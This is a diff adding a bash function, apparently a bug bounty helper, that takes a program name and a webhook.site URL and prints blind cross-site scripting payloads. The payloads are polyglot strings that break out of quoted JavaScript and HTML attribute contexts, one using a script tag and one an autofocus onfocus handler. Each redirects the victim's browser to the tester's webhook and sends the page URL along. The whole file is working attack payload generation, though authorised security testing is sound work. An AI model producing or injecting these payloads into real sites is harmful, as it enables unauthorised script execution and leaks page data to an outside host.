@@ -1,0 +1,14 @@
+bxss() {
+  clear
+  read -p "Enter the name of the program you're hunting: " progname
+  read -p "Enter your webhook.site URL: " hookurl
+
+  echo -e "\n📦 BXSS PAYLOADS for '$progname'\n"
+  echo "\`; window.location.href=\`"$hookurl"/?name="$progname"&link=\`+encodeURIComponent(window.location.href)//\"; window.location.href=\""$hookurl"/?name="$progname"&link=\"+encodeURIComponent(window.location.href)//'; window.location.href='"$hookurl"/?name="$progname"&cookie=&link='+encodeURIComponent(window.location.href))//'>\"><script>window.location.href=\`"$hookurl"/?name="$progname"&link=\`+encodeURIComponent(window.location.href)</script>"
+  echo "## CASE2"
+  echo "'\" onfocus=\"window.location='"$hookurl"/?name="$progname"&link='+encodeURIComponent(window.location.href)\" autofocus "
+  echo ""
+  echo "(In next update I may add more cases, e.g. inj inside textarea/title tag like cases)"
+
+
+}
